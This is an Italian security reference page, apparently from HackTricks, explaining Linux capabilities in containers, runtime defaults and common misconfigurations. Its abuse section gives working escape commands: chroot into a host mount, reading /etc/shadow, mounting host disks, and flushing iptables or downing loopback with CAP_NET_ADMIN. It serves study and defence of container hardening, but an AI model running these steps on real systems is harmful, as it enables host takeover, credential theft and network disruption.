# Capacità Linux nei container

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

Le Linux capabilities sono uno degli elementi più importanti per la sicurezza dei container perché rispondono a una domanda sottile ma fondamentale: **cosa significa davvero "root" all'interno di un container?** Su un sistema Linux normale, lo UID 0 implicava storicamente un set di privilegi molto ampio. Nei kernel moderni, quel privilegio è scomposto in unità più piccole chiamate capabilities. Un processo può essere eseguito come root e comunque non avere molte operazioni potenti se le capability rilevanti sono state rimosse.

I container dipendono fortemente da questa distinzione. Molti carichi di lavoro vengono ancora avviati come UID 0 all'interno del container per compatibilità o semplicità. Senza il dropping delle capability, sarebbe troppo pericoloso. Con il dropping delle capability, un processo root containerizzato può ancora eseguire molte normali operazioni interne al container mentre gli sono negate operazioni kernel più sensibili. Per questo una shell nel container che mostra `uid=0(root)` non significa automaticamente "host root" o anche solo "ampio privilegio kernel". Sono i set di capability a decidere quanto valga effettivamente quell'identità root.

Per il riferimento completo sulle Linux capabilities e molti esempi di abuso, vedi:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Operazione

Le capability sono tracciate in diversi set, inclusi permitted, effective, inheritable, ambient e bounding set. Per molte valutazioni di container, la semantica esatta del kernel di ciascun set è meno immediatamente importante della domanda pratica finale: **quali operazioni privilegiate può questo processo eseguire con successo in questo momento, e quali guadagni di privilegio futuri sono ancora possibili?**

Il motivo per cui questo è importante è che molte tecniche di breakout sono in realtà problemi di capability mascherati da problemi di container. Un carico di lavoro con `CAP_SYS_ADMIN` può accedere a una grande quantità di funzionalità kernel che un normale processo root in un container non dovrebbe toccare. Un carico di lavoro con `CAP_NET_ADMIN` diventa molto più pericoloso se condivide anche il network namespace dell'host. Un carico di lavoro con `CAP_SYS_PTRACE` diventa molto più interessante se può vedere i processi dell'host tramite la condivisione del PID dell'host. In Docker o Podman ciò può apparire come `--pid=host`; in Kubernetes di solito appare come `hostPID: true`.

In altre parole, il set di capability non può essere valutato in isolamento. Deve essere letto insieme a namespaces, seccomp e alle policy MAC.

## Laboratorio

Un modo molto diretto per ispezionare le capability all'interno di un container è:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Puoi anche confrontare un container più restrittivo con uno a cui sono state aggiunte tutte le capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Per vedere l'effetto di un'aggiunta mirata, prova a rimuovere tutto e ad aggiungere di nuovo soltanto una capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Questi piccoli esperimenti aiutano a mostrare che un runtime non sta semplicemente commutando un booleano chiamato 'privileged'. Sta plasmando la reale superficie di privilegi disponibile al processo.

## Capacità ad alto rischio

Although many capabilities can matter depending on the target, a few are repeatedly relevant in container escape analysis.

**`CAP_SYS_ADMIN`** è quella che i difensori dovrebbero trattare con la massima sospetto. È spesso descritta come "the new root" perché sblocca una quantità enorme di funzionalità, incluse operazioni legate a mount, comportamenti sensibili ai namespace e molti percorsi del kernel che non dovrebbero mai essere esposti con leggerezza ai container. Se un container ha `CAP_SYS_ADMIN`, seccomp debole e nessuna forte MAC confinement, molte vie classiche di breakout diventano molto più realistiche.

**`CAP_SYS_PTRACE`** conta quando esiste visibilità dei processi, specialmente se il PID namespace è condiviso con l'host o con workload vicini interessanti. Può trasformare la visibilità in manomissione.

**`CAP_NET_ADMIN`** e **`CAP_NET_RAW`** sono importanti in ambienti focalizzati sulla rete. Su una rete bridge isolata possono già essere rischiose; su un host network namespace condiviso sono molto peggiori perché il workload potrebbe essere in grado di riconfigurare la rete dell'host, sniffare, spoofare o interferire con i flussi di traffico locali.

**`CAP_SYS_MODULE`** è di solito catastrofica in un ambiente rootful perché caricare moduli del kernel equivale effettivamente a controllo del kernel host. Dovrebbe quasi mai apparire in un workload container generico.

## Utilizzo del runtime

Docker, Podman, containerd-based stacks e CRI-O usano tutti controlli sulle capability, ma i default e le interfacce di gestione differiscono. Docker le espone molto direttamente tramite flag come `--cap-drop` e `--cap-add`. Podman espone controlli simili e frequentemente beneficia di rootless execution come ulteriore livello di sicurezza. Kubernetes espone aggiunte e rimozioni di capability tramite il Pod o il container `securityContext`. Ambienti system-container come LXC/Incus si affidano anch'essi al controllo delle capability, ma l'integrazione più ampia con l'host di quei sistemi spesso induce gli operatori a rilassare i default in modo più aggressivo rispetto a quanto farebbero in un ambiente di app-container.

Lo stesso principio vale per tutti: una capability che è tecnicamente possibile concedere non è necessariamente una che dovrebbe essere concessa. Molti incidenti reali iniziano quando un operatore aggiunge una capability semplicemente perché un workload ha fallito sotto una configurazione più restrittiva e il team aveva bisogno di una soluzione rapida.

## Malconfigurazioni

L'errore più ovvio è **`--cap-add=ALL`** nelle CLI in stile Docker/Podman, ma non è l'unico. In pratica, un problema più comune è concedere una o due capability estremamente potenti, specialmente `CAP_SYS_ADMIN`, per "far funzionare l'applicazione" senza comprendere anche le implicazioni su namespace, seccomp e mount. Un altro modo comune di fallire è combinare capability extra con la condivisione dei namespace dell'host. In Docker o Podman questo può apparire come `--pid=host`, `--network=host` o `--userns=host`; in Kubernetes l'esposizione equivalente spesso appare tramite impostazioni del workload come `hostPID: true` o `hostNetwork: true`. Ognuna di queste combinazioni cambia ciò che la capability può effettivamente influenzare.

È anche comune vedere amministratori credere che, poiché un workload non è completamente `--privileged`, sia comunque vincolato in modo significativo. A volte è vero, ma a volte la postura effettiva è già sufficientemente vicina a privileged che la distinzione smette di avere importanza operativa.

## Abuso

Il primo passo pratico è enumerare l'insieme di capability effettive e testare immediatamente le azioni specifiche per le capability che potrebbero essere rilevanti per l'escape o l'accesso alle informazioni dell'host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Se `CAP_SYS_ADMIN` è presente, testa prima mount-based abuse e host filesystem access, perché questo è uno dei breakout enablers più comuni:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Se `CAP_SYS_PTRACE` è presente e il container può vedere processi interessanti, verifica se la capability può essere trasformata in ispezione dei processi:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Se `CAP_NET_ADMIN` o `CAP_NET_RAW` è presente, verifica se il workload può manipolare lo stack di rete visibile o almeno raccogliere informazioni utili sulla rete:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Quando un test per una capability ha successo, combinalo con la situazione dei namespace. Una capability che sembra semplicemente rischiosa in un namespace isolato può diventare immediatamente una primitive di escape o host-recon quando il container condivide anche host PID, host network o host mounts.

### Esempio completo: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Se il container ha `CAP_SYS_ADMIN` e una bind mount scrivibile del filesystem dell'host come `/host`, il percorso di escape è spesso semplice:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Se `chroot` riesce, i comandi ora vengono eseguiti nel contesto del filesystem root dell'host:
```bash
id
hostname
cat /etc/shadow | head
```
Se `chroot` non è disponibile, lo stesso risultato può spesso essere ottenuto richiamando l'eseguibile tramite l'albero montato:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Esempio completo: `CAP_SYS_ADMIN` + Accesso al dispositivo

Se un dispositivo a blocchi del host è esposto, `CAP_SYS_ADMIN` può trasformarlo in accesso diretto al filesystem dell'host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Esempio completo: `CAP_NET_ADMIN` + Networking dell'host

Questa combinazione non produce sempre direttamente root dell'host, ma può riconfigurare completamente lo stack di rete dell'host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Questo può consentire denial of service, intercettazione del traffico o accesso a servizi che in precedenza erano filtrati.

## Checks

Lo scopo dei controlli delle capability non è solo quello di esporre i valori grezzi, ma di capire se il processo possieda privilegi sufficienti da rendere pericolosa la sua attuale situazione di namespace e mount.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Cosa c'è di interessante qui:

- `capsh --print` è il modo più semplice per individuare capability ad alto rischio come `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, o `cap_sys_module`.
- La riga `CapEff` in `/proc/self/status` indica ciò che è effettivamente attivo ora, non solo ciò che potrebbe essere disponibile in altri set.
- Un capability dump diventa molto più importante se il container condivide anche i namespace del host per PID, rete o utenti, o ha host mounts scrivibili.

Dopo aver raccolto le informazioni raw sulle capability, il passo successivo è l'interpretazione. Chiediti se il processo è root, se i user namespaces sono attivi, se i host namespaces sono condivisi, se seccomp è applicato, e se AppArmor o SELinux limitano ancora il processo. Un set di capability da solo è solo una parte della storia, ma spesso è la parte che spiega perché un container breakout funziona e un altro fallisce con lo stesso apparente punto di partenza.

## Valori predefiniti del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Set di capability ridotto per impostazione predefinita | Docker mantiene una allowlist predefinita di capability e rimuove le altre | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Set di capability ridotto per impostazione predefinita | I container Podman sono non-privilegiati per impostazione predefinita e usano un modello di capability ridotto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Eredita le impostazioni del runtime, salvo modifiche | Se non sono specificati `securityContext.capabilities`, il container ottiene il set di capability predefinito dal runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Di solito le impostazioni predefinite del runtime | Il set effettivo dipende dal runtime più lo spec del Pod | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Per Kubernetes, il punto importante è che l'API non definisce un set di capability predefinito universale. Se il Pod non aggiunge o rimuove capability, il workload eredita il set predefinito del runtime per quel nodo.
